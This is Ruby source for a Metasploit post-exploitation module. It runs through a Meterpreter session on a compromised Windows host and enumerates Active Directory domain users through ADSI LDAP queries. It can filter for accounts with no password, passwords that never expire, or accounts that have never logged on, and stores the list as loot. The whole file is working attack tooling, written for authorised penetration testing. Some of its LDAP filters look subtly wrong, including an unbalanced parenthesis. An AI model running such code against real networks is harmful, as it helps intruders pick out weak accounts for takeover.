require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather AD Enumerate Domain User Accounts',
        'Description'   => %q{ This Module will perform an ADSI query and enumerate
          domain users and can filter depending on User Account Control Parameters
          on the domain the host is a member of through a Windows Meterpreter Session.},
        'License'       => BSD_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter']
      ))
    register_options(
      [
        OptBool.new('EXCLUDE_LOCKED', [true, 'Exclude in search locked accounts..', false]),
        OptBool.new('EXCLUDE_DISABLED', [true, 'Exclude from search disabled accounts.', false]),
        OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
        OptEnum.new('PASSWORD_STATE', [true, 'Filter for the state of the account when authenticating using a password.', 'ANY', ['ANY',
          'NO_PASSWORD',
          'CHANGE_PASSWORD',
          'NEVER_EXPIRES',
          'SMARTCARD_REQUIRED',
          'NEVER_LOGGEDON']]),
        OptInt.new('MAX', [false, 'The number of maximun results to enumerate.', 100])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Make sure the extension is loaded.
    if load_extapi
      domain = get_domain
      if (!domain.nil?)

        table = Rex::Ui::Text::Table.new(
          'Indent' => 4,
          'SortIndex' => -1,
          'Width' => 80,
          'Columns' =>
          [
            'SAMAccount',
            'Email',
            'Comment',
            'PrimaryGroupID',
            'DistinguishedName'
          ]
        )
        inner_filter = "(sAMAccountType=805306368)"
        if datastore['EXCLUDE_LOCKED']
          inner_filter = "#{inner_filter}(!(lockoutTime>=1))"
        end

        if datastore['EXCLUDE_DISABLED']
          inner_filter = "#{inner_filter}(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        end

        case datastore['PASSWORD_STATE']

        when 'ANY'
          inner_filter = "#{inner_filter}"

        when 'NO_PASSWORD'
          inner_filter = "#{inner_filter}((groupType:1.2.840.113556.1.4.803:=32)"

        when 'CHANGE_PASSWORD'
          inner_filter = "#{inner_filter}(!sAMAccountType=805306370)(pwdlastset=0)"

        when 'NEVER_EXPIRES'
          inner_filter = "#{inner_filter}(groupType:1.2.840.113556.1.4.803:=65536)"

        when 'SMARTCARD_REQUIRED'
          inner_filter = "#{inner_filter}(groupType:1.2.840.113556.1.4.803:=262144)"

        when 'NEVER_LOGGEDON'
          inner_filter = "#{inner_filter}(|(lastlogon=0)(!lastlogon=*))"
        end

        filter =   "(&#{inner_filter})"
        query_result = session.extapi.adsi.domain_query(domain,
                                                        filter,
                                                        datastore['MAX'],
                                                        datastore['MAX'],
                                                        ["samaccountname",'mail','comment','primarygroupid','distinguishedname']
                                                      )
        query_result[:results].each do |obj|
           table << obj
        end
        table.print
        print_line

        if datastore['STORE_LOOT']
          stored_path = store_loot('ad.locked_users', 'text/plain', session, table.to_csv)
          print_status("Results saved to: #{stored_path}")
        end
      end
    end
  end

  def get_domain()
    domain = nil
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
      v_name = "DCName"
      domain_dc = registry_getvaldata(subkey, v_name)
    rescue
      print_error("Could not determine if the host is part of a domain.")
      return nil
    end
    if (!domain_dc.nil?)
      # leys parse the information
      dom_info =  domain_dc.split('.')
      domain = dom_info[1].upcase
    else
      print_status "Host is not part of a domain."
    end
    return domain
  end
end